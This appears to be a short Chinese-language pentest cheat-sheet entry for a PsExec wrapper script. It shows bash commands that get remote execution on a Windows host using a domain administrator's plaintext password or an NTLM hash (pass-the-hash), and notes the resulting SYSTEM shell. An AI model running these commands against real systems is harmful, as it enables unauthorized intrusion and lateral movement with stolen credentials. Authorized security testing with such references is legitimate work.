### PsExec

| 属性 | 值 |
|------|-----|
| 版本 | 0.9.24 |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `RCE` `SMB` `PTH` |

## PsExec 远程命令执行与 PTH

### 使用明文密码连接
```bash
bash psexec_pth.sh contoso.com/administrator:Admin@123@192.168.1.10
```

### 使用 NTLM Hash 进行哈希传递连接
```bash
bash psexec_pth.sh contoso.com/administrator@192.168.1.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

### 执行单条命令
```bash
bash psexec_pth.sh contoso.com/administrator:Admin@123@192.168.1.10 'ipconfig /all'
```

- ✓ 直接获取 SYSTEM 权限的交互式 Shell
- ✓ 支持 Pass-the-Hash
- 会在目标机器上创建服务并上传可执行文件
